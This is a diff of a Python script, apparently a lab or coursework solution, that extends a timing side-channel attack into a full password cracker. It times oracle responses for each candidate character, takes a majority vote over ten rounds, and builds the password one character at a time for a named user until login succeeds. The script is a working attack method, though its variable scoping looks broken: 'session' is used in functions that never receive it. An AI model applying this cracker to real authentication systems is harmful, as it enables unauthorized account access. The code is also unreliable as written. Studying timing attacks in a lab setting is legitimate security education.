@@ -14,22 +14,33 @@ def handle_timing_sidechannel():
     session = requests.Session()
     # user = assignment["user"]
     user = "jeanluc"
+    crack_password(user, alphabet)
     # password = assignment["password"]
-    for i in range(10):
-        char = crack_char(user, alphabet)
-        print(char, "Round: ", i)
-
     session.close()
 
-def crack_char(user, alphabet):
-    char_stats = []
-    for char in alphabet:
-        status, time = query_oracle(session, user, char+char)
-        char_stats.append((char, time))
-    # sort the list by time in descending order
-    char_stats.sort(key=lambda x: x[1], reverse=True)
-    return char_stats[0]
-
+def crack_password(user, alphabet):
+    password = ""
+    while True:
+        char = crack_char(user, alphabet, password)
+        password += char
+        print(password)
+        status, time = query_oracle(session, user, password)
+        if status == "auth_success":
+            print("password found: " + password)
+            break
+def crack_char(user, alphabet, password):
+    total_stats = []
+    for i in range(10):
+        char_stats = []
+        for char in alphabet:
+            status, time = query_oracle(session, user, password+char+char)
+            char_stats.append((char, time))
+        # sort the list by time in descending order
+        char_stats.sort(key=lambda x: x[1], reverse=True)
+        print(char_stats[0])
+        total_stats.append(char_stats[0][0])
+    # get the most common character at the first position in total_stats
+    return(max(set(total_stats), key=total_stats.count))
 
 
 
